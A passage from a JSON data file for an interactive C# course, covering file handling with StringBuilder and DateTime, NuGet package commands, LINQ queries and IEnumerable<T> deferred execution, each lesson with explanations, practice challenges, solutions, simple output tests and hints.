              "content": "## Watch Out For These Mistakes!\n\n**String concatenation in loops**: DON'T use `str += x` in loops! Creates new string each iteration (slow). Use StringBuilder for building strings iteratively.\n\n**File path hardcoding**: Don't hardcode paths like `C:\\Users\\...`! Use `Path.Combine()` for cross-platform compatibility and `Environment.GetFolderPath()` for special folders.\n\n**Not checking File.Exists()**: Calling `File.ReadAllText()` on non-existent file throws! Always check first or wrap in try/catch.\n\n**DateTime timezone issues**: `DateTime.Now` is local time, `DateTime.UtcNow` is UTC. For apps across timezones, use `DateTimeOffset` which stores timezone info!\n\n**Forgetting to dispose resources**: File streams need disposing! Use `using` statement: `using var stream = File.OpenRead(path);` or wrap in try/finally."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-08-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a simple journal/diary application using System libraries!\n\n1. Create a 'journal.txt' file\n2. Use StringBuilder to build an entry:\n   - Current date/time (DateTime.Now)\n   - User's mood (ask user)\n   - User's journal entry (ask user)\n3. Append the entry to journal.txt\n4. Read and display all entries from the file\n5. Display how many days until New Year (use DateTime and TimeSpan)",
              "starterCode": "using System;\nusing System.IO;\nusing System.Text;\n\nstring filePath = \"journal.txt\";\n\n// Build journal entry with StringBuilder\nStringBuilder entry = new StringBuilder();\n\n// Add current date/time\n\n// Ask for mood and journal text\nConsole.WriteLine(\"How are you feeling?\");\nstring mood = Console.ReadLine();\n\nConsole.WriteLine(\"What's on your mind?\");\nstring thoughts = Console.ReadLine();\n\n// Build entry\n\n// Append to file\n\n// Read all entries\n\n// Calculate days until New Year",
              "solution": "using System;\nusing System.IO;\nusing System.Text;\n\nstring filePath = \"journal.txt\";\n\nStringBuilder entry = new StringBuilder();\nentry.AppendLine(\"=== Journal Entry ===\");\nentry.AppendLine(\"Date: \" + DateTime.Now.ToString(\"yyyy-MM-dd HH:mm\"));\n\nConsole.WriteLine(\"How are you feeling?\");\nstring mood = Console.ReadLine();\nentry.AppendLine(\"Mood: \" + mood);\n\nConsole.WriteLine(\"What's on your mind?\");\nstring thoughts = Console.ReadLine();\nentry.AppendLine(\"Entry: \" + thoughts);\nentry.AppendLine(\"\");\n\nFile.AppendAllText(filePath, entry.ToString());\nConsole.WriteLine(\"Journal entry saved!\");\n\nif (File.Exists(filePath))\n{\n    Console.WriteLine(\"\\nAll entries:\");\n    string allEntries = File.ReadAllText(filePath);\n    Console.WriteLine(allEntries);\n}\n\nDateTime newYear = new DateTime(DateTime.Now.Year + 1, 1, 1);\nTimeSpan timeUntil = newYear - DateTime.Now;\nConsole.WriteLine(\"Days until New Year: \" + (int)timeUntil.TotalDays);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Journal\"",
                  "expectedOutput": "Journal",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"saved\"",
                  "expectedOutput": "saved",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Days until\"",
                  "expectedOutput": "Days until",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "StringBuilder: 'new StringBuilder()', then '.Append()' or '.AppendLine()'. Files: 'File.AppendAllText(path, text)'. DateTime: 'DateTime.Now', subtract dates for TimeSpan."
                },
                {
                  "level": 2,
                  "text": "File path issues: On Windows, use @\"C:\\folder\\file.txt\" (verbatim string with @) or \"C:\\\\folder\\\\file.txt\" (escape backslashes). Or use Path.Combine() for cross-platform!"
                },
                {
                  "level": 3,
                  "text": "String concatenation in loops: DON'T use '+' in loops for strings! 'str += x' creates new string each time (slow!). Use StringBuilder for loops."
                },
                {
                  "level": 4,
                  "text": "DateTime vs DateTimeOffset: DateTime doesn't store timezone! For apps across timezones, use DateTimeOffset. For local-only apps, DateTime is fine."
                },
                {
                  "level": 5,
                  "text": "Not checking File.Exists(): Calling File.ReadAllText() on non-existent file throws exception! Always check 'if (File.Exists(path))' first, or use try/catch."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "File path issues",
                  "consequence": "On Windows, use @\"C:\\folder\\file.txt\" (verbatim string with @) or \"C:\\\\folder\\\\file.txt\" (escape backslashes). Or use Path.Combine() for cross-platform!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "String concatenation in loops",
                  "consequence": "DON'T use '+' in loops for strings! 'str += x' creates new string each time (slow!). Use StringBuilder for loops.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "DateTime vs DateTimeOffset",
                  "consequence": "DateTime doesn't store timezone! For apps across timezones, use DateTimeOffset. For local-only apps, DateTime is fine.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not checking File.Exists()",
                  "consequence": "Calling File.ReadAllText() on non-existent file throws exception! Always check 'if (File.Exists(path))' first, or use try/catch.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-08-05",
          "title": "NuGet (The App Store for Code)",
          "moduleId": "module-08",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you want to add GPS navigation to your phone. You don't build it from scratch - you download an app from the App Store!\n\nThat's what NUGET is - the 'app store' for C# code libraries (called PACKAGES):\n• Need to work with JSON? Use built-in System.Text.Json (or install Newtonsoft.Json)\n• Need to send emails? Install MailKit\n• Need to parse CSV files? Install CsvHelper\n• Need to connect to databases? Install Entity Framework Core\n\nThese packages are built by other developers and SHARED for free (mostly). They're:\n• TESTED by thousands of users\n• MAINTAINED with bug fixes\n• DOCUMENTED with examples\n• VERSIONED (you can upgrade/downgrade)\n\nThink: NuGet = 'Don't write everything yourself! Stand on the shoulders of giants.' Professional developers use dozens of NuGet packages!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ========== NUGET CLI COMMANDS ==========\n// Run these in terminal (in your project folder):\n\n// Install a package (latest version)\n// dotnet add package Humanizer\n\n// Install specific version\n// dotnet add package Newtonsoft.Json --version 13.0.3\n\n// List installed packages\n// dotnet list package\n\n// Check for outdated packages\n// dotnet list package --outdated\n\n// Remove a package\n// dotnet remove package Humanizer\n\n// Restore all packages (after cloning)\n// dotnet restore\n\n// ========== USING PACKAGES IN CODE ==========\nusing System;\nusing System.Text.Json;  // Built-in JSON library (modern .NET)\nusing Humanizer;  // Third-party: makes things human-readable\n\n// JSON SERIALIZATION with System.Text.Json (BUILT-IN - no install!)\nclass Person\n{\n    public string Name { get; set; }\n    public int Age { get; set; }\n    public string Email { get; set; }\n}\n\nPerson person = new Person \n{ \n    Name = \"Alice\", \n    Age = 30, \n    Email = \"alice@example.com\" \n};\n\n// Convert object to JSON string\nvar options = new JsonSerializerOptions \n{ \n    WriteIndented = true,\n    PropertyNamingPolicy = JsonNamingPolicy.CamelCase  // JSON uses camelCase\n};\nstring json = JsonSerializer.Serialize(person, options);\nConsole.WriteLine(\"JSON:\\n\" + json);\n\n// Convert JSON string back to object\nstring jsonData = \"{\\\"name\\\":\\\"Bob\\\",\\\"age\\\":25}\";\nPerson restored = JsonSerializer.Deserialize<Person>(jsonData, options)!;\nConsole.WriteLine(\"Name: \" + restored.Name);\n\n// HUMANIZER library (requires: dotnet add package Humanizer)\nDateTime past = DateTime.Now.AddDays(-5);\nConsole.WriteLine(past.Humanize());  // \"5 days ago\"\nConsole.WriteLine(\"NoOfDonuts\".Humanize());  // \"No of donuts\"",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`dotnet add package PackageName`**: Install a NuGet package. Run in project folder. Adds to .csproj automatically. Latest version by default.\n\n**`dotnet add package Name --version 8.0.0`**: Install specific version. Use when you need compatibility with older code or want to avoid breaking changes.\n\n**`dotnet list package`**: Show all installed packages and their versions. Add `--outdated` to see which packages have updates available!\n\n**`dotnet remove package Name`**: Uninstall a package. Removes from .csproj file.\n\n**`dotnet restore`**: Download all packages listed in .csproj. Run after cloning a project or if packages are missing.\n\n**`JsonSerializer.Serialize()`**: From System.Text.Json (built-in). Converts C# objects to JSON strings. Use JsonSerializerOptions { WriteIndented = true } for readable output.\n\n**`JsonSerializer.Deserialize<T>()`**: Converts JSON string back to C# object. Specify type with <Person>. Returns null if JSON doesn't match structure - use ! operator when you know data is valid."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Version conflicts**: Different packages might need different versions of the same dependency! Check the build output for warnings. Use `dotnet list package --include-transitive` to see all dependencies.\n\n**System.Text.Json vs Newtonsoft.Json**: System.Text.Json is BUILT-IN (no install needed) and faster, but has stricter defaults. Newtonsoft.Json is more flexible but requires installation. Choose based on your needs.\n\n**Property naming in JSON**: By default, System.Text.Json uses PascalCase. If your JSON uses camelCase, add `[JsonPropertyName(\"name\")]` attribute or use `PropertyNamingPolicy = JsonNamingPolicy.CamelCase` in options.\n\n**Null after deserialization**: If JSON structure doesn't match your class, you get null or default values! Always validate deserialized data. Use the ! operator only when you're SURE data is valid.\n\n**Running commands in wrong folder**: `dotnet add package` must run in the folder containing your .csproj file! Check your current directory first."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-08-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Work with JSON data using System.Text.Json!\n\n1. Create a 'Book' class:\n   - string Title\n   - string Author\n   - int Year\n   - decimal Price\n\n2. Create a List of 3 books\n\n3. Use JsonSerializer.Serialize() to convert list to JSON\n   - Use JsonSerializerOptions { WriteIndented = true } for readability\n   - Display the JSON\n\n4. Save JSON to a file (books.json)\n\n5. Read the file back and deserialize to List<Book>\n\n6. Display all book titles from the deserialized list\n\nNOTE: System.Text.Json is built into .NET - no NuGet install needed!",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Text.Json;\n\nclass Book\n{\n    // Define properties\n}\n\n// Create list of books\nList<Book> books = new List<Book>();\n\n// Add 3 books\n\n// Serialize to JSON\nstring json = JsonSerializer.Serialize(books, new JsonSerializerOptions { WriteIndented = true });\nConsole.WriteLine(\"JSON:\\n\" + json);\n\n// Save to file\n\n// Read from file and deserialize\n\n// Display book titles",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Text.Json;\n\nclass Book\n{\n    public string Title { get; set; }\n    public string Author { get; set; }\n    public int Year { get; set; }\n    public decimal Price { get; set; }\n}\n\nList<Book> books = new List<Book>();\nbooks.Add(new Book { Title = \"1984\", Author = \"Orwell\", Year = 1949, Price = 15.99m });\nbooks.Add(new Book { Title = \"To Kill a Mockingbird\", Author = \"Lee\", Year = 1960, Price = 12.99m });\nbooks.Add(new Book { Title = \"The Great Gatsby\", Author = \"Fitzgerald\", Year = 1925, Price = 10.99m });\n\nstring json = JsonSerializer.Serialize(books, new JsonSerializerOptions { WriteIndented = true });\nConsole.WriteLine(\"JSON:\\n\" + json);\n\nFile.WriteAllText(\"books.json\", json);\nConsole.WriteLine(\"\\nSaved to books.json\");\n\nstring fileContent = File.ReadAllText(\"books.json\");\nList<Book> loadedBooks = JsonSerializer.Deserialize<List<Book>>(fileContent)!;\n\nConsole.WriteLine(\"\\nLoaded books:\");\nforeach (Book book in loadedBooks)\n{\n    Console.WriteLine(\"- \" + book.Title + \" by \" + book.Author);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"JSON\"",
                  "expectedOutput": "JSON",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Saved\"",
                  "expectedOutput": "Saved",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Loaded books\"",
                  "expectedOutput": "Loaded books",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Serialize: 'JsonSerializer.Serialize(obj, new JsonSerializerOptions { WriteIndented = true })'. Deserialize: 'JsonSerializer.Deserialize<Type>(json)!'. Save/load JSON with File.WriteAllText and File.ReadAllText."
                },
                {
                  "level": 2,
                  "text": "System.Text.Json is built-in: Unlike third-party packages, System.Text.Json comes with .NET - no installation needed! Just add 'using System.Text.Json;' at the top."
                },
                {
                  "level": 3,
                  "text": "Property names must match JSON: JsonSerializer uses property names! If JSON has \\\"title\\\" but your class has \\\"Title\\\", use [JsonPropertyName(\\\"title\\\")] attribute or it won't map correctly."
                },
                {
                  "level": 4,
                  "text": "Null reference after deserialize: If JSON structure doesn't match class, Deserialize returns null or incomplete object! Use the ! operator when you know data is valid, or check for null."
                },
                {
                  "level": 5,
                  "text": "Versioning conflicts: Different packages might need different versions of same dependency! NuGet usually resolves this, but sometimes you get conflicts. Check package compatibility."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Missing using statement",
                  "consequence": "System.Text.Json is built into .NET - no installation needed! Just add 'using System.Text.Json;' at the top of your file.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Property names must match JSON",
                  "consequence": "JsonSerializer uses property names! If JSON has \\\"title\\\" but your class has \\\"Title\\\", use [JsonPropertyName(\\\"title\\\")] attribute or it won't map correctly.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Null reference after deserialize",
                  "consequence": "If JSON structure doesn't match class, Deserialize returns null or incomplete object! Use the ! operator when you know data is valid, or check for null.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Versioning conflicts",
                  "consequence": "Different packages might need different versions of same dependency! NuGet usually resolves this, but sometimes you get conflicts. Check package compatibility.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-09",
      "title": "LINQ and Query Expressions",
      "description": "Learn Language Integrated Query (LINQ) for querying collections, filtering, sorting, and data transformation.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-09-01",
          "title": "What is LINQ? (The Search Engine Analogy)",
          "moduleId": "module-09",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you have 1000 photos on your phone. You want to find:\n• All photos from 2023\n• Only photos of your dog\n• Photos sorted by date\n\nYou could write a FOR LOOP to check each photo manually... OR you could use the built-in search feature! Much easier!\n\nThat's what LINQ is - a 'search engine' for collections in C#:\n• LINQ = Language Integrated Query\n• Works on any collection: arrays, Lists, Dictionaries\n• Write SQL-like queries in C# code\n• Much cleaner than manual loops!\n\nTwo syntaxes:\n1. METHOD SYNTAX: list.Where(x => x > 5).OrderBy(x => x)\n2. QUERY SYNTAX: from x in list where x > 5 orderby x select x\n\nMost developers use METHOD syntax (we'll focus on that!).\n\nThink: LINQ = 'Asking your collection smart questions instead of manually digging through it.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates LINQ in action, comparing the traditional loop approach with the concise LINQ query syntax.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;  // MUST include System.Linq!\n\nList<int> numbers = new List<int> { 1, 5, 2, 8, 3, 9, 4, 7, 6 };\n\n// WITHOUT LINQ - manual loop\nList<int> evenNumbers = new List<int>();\nforeach (int num in numbers)\n{\n    if (num % 2 == 0)\n    {\n        evenNumbers.Add(num);\n    }\n}\nConsole.WriteLine(\"Even (without LINQ): \" + string.Join(\", \", evenNumbers));\n\n// WITH LINQ - one line!\nvar evenLinq = numbers.Where(n => n % 2 == 0);\nConsole.WriteLine(\"Even (with LINQ): \" + string.Join(\", \", evenLinq));\n\n// More LINQ examples\nvar greaterThanFive = numbers.Where(n => n > 5);\nvar sorted = numbers.OrderBy(n => n);\nvar firstThree = numbers.Take(3);\n\nConsole.WriteLine(\"Greater than 5: \" + string.Join(\", \", greaterThanFive));\nConsole.WriteLine(\"Sorted: \" + string.Join(\", \", sorted));\nConsole.WriteLine(\"First 3: \" + string.Join(\", \", firstThree));\n\n// QUERY SYNTAX (alternative)\nvar query = from n in numbers\n            where n > 5\n            orderby n descending\n            select n;\n\nConsole.WriteLine(\"Query syntax: \" + string.Join(\", \", query));",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`using System.Linq;`**: MUST include this namespace to use LINQ! Without it, methods like .Where(), .Select() won't be available.\n\n**`collection.Where(x => condition)`**: Where() filters items. 'x => condition' is a LAMBDA expression (more next lesson!). Returns items where condition is true.\n\n**`Lambda: x => x > 5`**: 'x' is the parameter (each item). '=>' means 'goes to'. 'x > 5' is the expression. Read as: 'each item x goes to x > 5'.\n\n**`LINQ is lazy`**: LINQ doesn't execute immediately! 'var result = list.Where(...)' just creates a QUERY. Execution happens when you iterate (foreach) or call .ToList()."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Forgetting 'using System.Linq'**: Without this namespace import, you'll get 'Where does not exist' errors! LINQ methods are extension methods that require the System.Linq namespace.\n\n**Deferred Execution Gotcha**: The query doesn't run when you create it! `var result = list.Where(...)` just defines the query. The actual work happens when you iterate (foreach) or call .ToList(), .Count(), etc. If the source collection changes between query creation and execution, you'll get the NEW values!\n\n**Modifying source during iteration**: Never modify the source collection while iterating over LINQ results! You'll get 'Collection was modified' exception.\n\n**Multiple enumeration performance**: Each time you iterate over an IEnumerable, the query re-executes. If you need to use results multiple times, call .ToList() once to materialize the results."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Practice basic LINQ queries!\n\n1. Create a List of integers: 10, 25, 5, 30, 15, 40, 20, 35\n\n2. Use LINQ to:\n   - Find all numbers greater than 20\n   - Find all numbers divisible by 5 (n % 5 == 0)\n   - Sort numbers in descending order\n   - Get the first 3 numbers (after sorting)\n\n3. Display each result with descriptive labels\n\nUSE .Where(), .OrderByDescending(), and .Take()!",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<int> numbers = new List<int> { 10, 25, 5, 30, 15, 40, 20, 35 };\n\n// Find numbers > 20\nvar greaterThan20 = numbers.Where(n => /* condition */);\n\n// Find numbers divisible by 5\nvar divisibleByFive = numbers.Where(n => /* condition */);\n\n// Sort descending\nvar sorted = numbers.OrderByDescending(n => n);\n\n// First 3 from sorted\nvar topThree = sorted.Take(3);\n\n// Display results\nConsole.WriteLine(\"Greater than 20: \" + string.Join(\", \", greaterThan20));",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<int> numbers = new List<int> { 10, 25, 5, 30, 15, 40, 20, 35 };\n\nvar greaterThan20 = numbers.Where(n => n > 20);\nConsole.WriteLine(\"Greater than 20: \" + string.Join(\", \", greaterThan20));\n\nvar divisibleByFive = numbers.Where(n => n % 5 == 0);\nConsole.WriteLine(\"Divisible by 5: \" + string.Join(\", \", divisibleByFive));\n\nvar sorted = numbers.OrderByDescending(n => n);\nConsole.WriteLine(\"Sorted descending: \" + string.Join(\", \", sorted));\n\nvar topThree = sorted.Take(3);\nConsole.WriteLine(\"Top 3: \" + string.Join(\", \", topThree));",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Greater than 20\"",
                  "expectedOutput": "Greater than 20",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Divisible by 5\"",
                  "expectedOutput": "Divisible by 5",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Top 3\"",
                  "expectedOutput": "Top 3",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Where: 'list.Where(x => condition)'. OrderByDescending: 'list.OrderByDescending(x => x)'. Take: 'list.Take(n)'. Don't forget 'using System.Linq;'!"
                },
                {
                  "level": 2,
                  "text": "Forgetting 'using System.Linq': Without this, you get 'Where does not exist' errors! LINQ methods are EXTENSION methods from System.Linq namespace."
                },
                {
                  "level": 3,
                  "text": "Expecting immediate execution: 'var result = list.Where(...)' doesn't run yet! It creates a query. Execution happens on iteration (.ToList(), foreach, etc.). This is called DEFERRED EXECUTION."
                },
                {
                  "level": 4,
                  "text": "Lambda syntax confusion: 'x => x > 5' is shorthand for a function! Read it as: 'for each x, return whether x > 5'. The '=>' is the lambda operator."
                },
                {
                  "level": 5,
                  "text": "Modifying original collection: LINQ doesn't modify the original! 'list.Where(...)' returns a NEW sequence. Original list is unchanged. Use .ToList() to get a new list."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'using System.Linq'",
                  "consequence": "Without this, you get 'Where does not exist' errors! LINQ methods are EXTENSION methods from System.Linq namespace.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Expecting immediate execution",
                  "consequence": "'var result = list.Where(...)' doesn't run yet! It creates a query. Execution happens on iteration (.ToList(), foreach, etc.). This is called DEFERRED EXECUTION.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Lambda syntax confusion",
                  "consequence": "'x => x > 5' is shorthand for a function! Read it as: 'for each x, return whether x > 5'. The '=>' is the lambda operator.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Modifying original collection",
                  "consequence": "LINQ doesn't modify the original! 'list.Where(...)' returns a NEW sequence. Original list is unchanged. Use .ToList() to get a new list.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-09-02",
          "title": "IEnumerable<T> (The Stream of Data)",
          "moduleId": "module-09",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a conveyor belt in a factory. Items move along one at a time. You don't need ALL items in memory - you process each one as it arrives!\n\nThat's IEnumerable<T> - it represents a SEQUENCE of items:\n• 'T' is the type: IEnumerable<int>, IEnumerable<string>\n• Items are accessed ONE AT A TIME (via foreach)\n• Doesn't load everything into memory at once\n• LINQ methods return IEnumerable<T>\n\nWhy use it?\n• MEMORY EFFICIENT: Query 1 million items without loading them all\n• LAZY EVALUATION: Computation happens only when needed\n• FLEXIBLE: Works with any collection type\n\nList<T> implements IEnumerable<T>, arrays implement it, LINQ results are IEnumerable<T>.\n\nThink: IEnumerable<T> = 'A promise of future items, delivered one at a time when you ask.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n// IEnumerable<T> as return type\nIEnumerable<int> GetNumbers()\n{\n    Console.WriteLine(\"Generating numbers...\");\n    yield return 1;\n    yield return 2;\n    yield return 3;\n}\n\nIEnumerable<int> numbers = GetNumbers();\nConsole.WriteLine(\"Method called, but not executed yet!\");\n\nforeach (int num in numbers)  // NOW it executes!\n{\n    Console.WriteLine(\"Number: \" + num);\n}\n\n// LINQ returns IEnumerable<T>\nList<int> sourceList = new List<int> { 1, 2, 3, 4, 5 };\nIEnumerable<int> evenNumbers = sourceList.Where(n => n % 2 == 0);\n\nConsole.WriteLine(\"Query created, not executed!\");\n\nforeach (int num in evenNumbers)  // Executes here!\n{\n    Console.WriteLine(\"Even: \" + num);\n}\n\n// Convert to concrete collection with .ToList() or .ToArray()\nList<int> evenList = sourceList.Where(n => n % 2 == 0).ToList();\nint[] evenArray = sourceList.Where(n => n % 2 == 0).ToArray();\n\nConsole.WriteLine(\"Count: \" + evenList.Count);  // .Count on List (property)\nConsole.WriteLine(\"Count: \" + evenNumbers.Count());  // .Count() on IEnumerable (method)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`IEnumerable<T>`**: Interface representing a sequence of items of type T. Any collection (List, array, etc.) can be treated as IEnumerable<T>.\n\n**`Deferred execution`**: LINQ queries return IEnumerable<T> but don't execute immediately! Execution happens when you iterate (foreach) or materialize (.ToList(), .Count(), etc.).\n\n**`.ToList() / .ToArray()`**: Converts IEnumerable<T> to concrete collection. Forces immediate execution. Use when you need to iterate multiple times or need Count/indexing.\n\n**`yield return`**: Advanced: Creates an IEnumerable<T> by returning items one at a time. Enables lazy evaluation. Each 'yield return' pauses execution until next item needed."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Multiple enumeration trap**: Each time you iterate over IEnumerable<T>, the query re-executes from scratch! If you call .Count() then foreach, the query runs TWICE. Use .ToList() first if you need multiple passes.\n\n**Collection modified during iteration**: IEnumerable is LIVE - it reflects the current state of the source. Adding items to the source list after creating the query will include them when you finally iterate! Use .ToList() immediately for a snapshot.\n\n**Disposed context**: When using IEnumerable with databases (EF Core), the query executes when you iterate. If the database context is disposed before iteration, you'll get an exception! Materialize before exiting the using block.\n\n**.Count vs .Count()**: List<T> has a .Count PROPERTY (instant, O(1)). IEnumerable<T> has .Count() METHOD that iterates the entire collection! On large lazy sequences, .Count() can be very slow."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Work with IEnumerable<T> and understand deferred execution!\n\n1. Create a List of strings: \"apple\", \"banana\", \"apricot\", \"blueberry\", \"avocado\"\n\n2. Use LINQ to create an IEnumerable<string> of fruits starting with 'a'\n   - DON'T use .ToList() yet!\n   - Print \"Query created\"\n\n3. Add \"cherry\" to the original list AFTER creating the query\n\n4. Now iterate the query result with foreach\n   - What do you notice? Does it include \"cherry\"?\n\n5. Create a second query for fruits longer than 6 characters\n   - Convert this one to a List with .ToList()\n   - Display the count and items",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<string> fruits = new List<string> { \"apple\", \"banana\", \"apricot\", \"blueberry\", \"avocado\" };\n\n// Query 1: starts with 'a' (deferred)\n// TODO: Add your .Where() condition for fruits starting with 'a'\nIEnumerable<string> startsWithA = fruits.Where(f => /* condition */);\nConsole.WriteLine(\"Query created\");\n\n// Add item AFTER query creation\nfruits.Add(\"cherry\");\n\n// Iterate query 1\nforeach (string fruit in startsWithA)\n{\n    Console.WriteLine(\"Starts with A: \" + fruit);\n}\n\n// Query 2: longer than 6 characters (materialized)\n// TODO: Add your .Where() condition for fruits longer than 6 characters\nList<string> longFruits = fruits.Where(f => /* condition */).ToList();\nConsole.WriteLine(\"Long fruits count: \" + longFruits.Count);",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<string> fruits = new List<string> { \"apple\", \"banana\", \"apricot\", \"blueberry\", \"avocado\" };\n\nIEnumerable<string> startsWithA = fruits.Where(f => f.StartsWith(\"a\"));\nConsole.WriteLine(\"Query created (deferred execution)\");\n\nfruits.Add(\"cherry\");\nConsole.WriteLine(\"Added 'cherry' to list\");\n\nConsole.WriteLine(\"\\nFruits starting with 'a':\");\nforeach (string fruit in startsWithA)\n{\n    Console.WriteLine(\"- \" + fruit);\n}\n\nList<string> longFruits = fruits.Where(f => f.Length > 6).ToList();\nConsole.WriteLine(\"\\nLong fruits (>6 chars): \" + longFruits.Count);\nforeach (string fruit in longFruits)\n{\n    Console.WriteLine(\"- \" + fruit);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Query created\"",
                  "expectedOutput": "Query created",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"cherry\"",
                  "expectedOutput": "cherry",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Long fruits\"",
                  "expectedOutput": "Long fruits",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "IEnumerable<T> queries execute when iterated! .Where() returns IEnumerable. .ToList() forces immediate execution. Use .StartsWith() for string prefix check."
                },
                {
                  "level": 2,
                  "text": "Iterating IEnumerable multiple times: Each iteration re-executes the query! If you need to iterate multiple times, use .ToList() once. Otherwise, expensive operations run repeatedly."
                },
                {
                  "level": 3,
                  "text": "Modifying collection during iteration: Don't change the source collection while iterating IEnumerable! You'll get 'Collection was modified' exception. Materialize with .ToList() first if you need to modify."
                },
                {
                  "level": 4,
                  "text": "Expecting snapshot behavior: IEnumerable is LIVE! If you create query, then modify source list, the query sees the changes when executed. For snapshot, use .ToList() immediately."
                },
                {
                  "level": 5,
                  "text": ".Count vs .Count(): IEnumerable<T> has .Count() METHOD (executes query!). List<T> has .Count PROPERTY (instant). Using .Count() on large IEnumerable can be slow!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Iterating IEnumerable multiple times",
                  "consequence": "Each iteration re-executes the query! If you need to iterate multiple times, use .ToList() once. Otherwise, expensive operations run repeatedly.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Modifying collection during iteration",
                  "consequence": "Don't change the source collection while iterating IEnumerable! You'll get 'Collection was modified' exception. Materialize with .ToList() first if you need to modify.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Expecting snapshot behavior",
                  "consequence": "IEnumerable is LIVE! If you create query, then modify source list, the query sees the changes when executed. For snapshot, use .ToList() immediately.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
